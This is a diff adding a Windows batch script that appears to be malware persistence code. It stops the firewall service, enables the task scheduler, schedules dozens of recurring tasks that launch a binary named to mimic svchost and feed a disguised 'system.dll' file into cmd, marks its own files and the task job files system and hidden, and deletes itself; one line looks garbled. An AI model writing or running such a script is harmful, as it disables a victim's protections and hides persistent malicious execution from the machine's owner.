@@ -1,0 +1,76 @@
+net stop sharedaccess
+sc stop sharedaccess
+sc config schedule start= auto
+net start schedule
+sc start  schedule
+systen32 /del /y
+for /L %%i IN (5,4,56) DO wa 9:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 10:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 11:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 12:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 13:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 14:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 15:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 16:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 17:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 18:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 19:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 20:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 21:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 22:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+for /L %%i IN (5,4,56) DO wa 23:0%%i:00 /every:m,t,w,th,f,s,su cmd /c start  C:\WINDOWS\system32\SVCHOTS.EXE
+wa 9:15 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 9:33 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 10:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 10:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 11:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 11:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 12:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 12:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 13:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 13:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 14:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 14:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 15:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 15:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 16:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 16:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 17:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 17:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 18:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 18:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 19:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 19:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 20:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 20:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 21:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 21:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 22:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 22:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 23:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 23:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 00:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 00:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 01:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 01:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 02:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 02:15 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 03:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 03:30 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 04:15 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 04:45 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 05:23 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 05:40 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 06:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 06:20 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 06:40 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 07:05 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 07:32 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 07:40 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 07:59 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 08:23 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 08:40 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+wa 09:00 /every:m,t,w,th,f,s,su cmd /c cmd ^<  "C:\Program Files\Internet Explorer\system.dll"
+ATTRIB "C:\Program Files\Internet Explorer\Attusb.dll" +s +h & ATTRIB "C:\Program Files\Internet Explorer\autousb.bat" +s +h & ATTRIB "C:\Program Files\Internet Explorer\system.dll" +s +h
+for /L %%i IN (1,1,280) DO ATTRIB C:\WINDOWS\Tasks\At%%i.job +s +h
+del %0
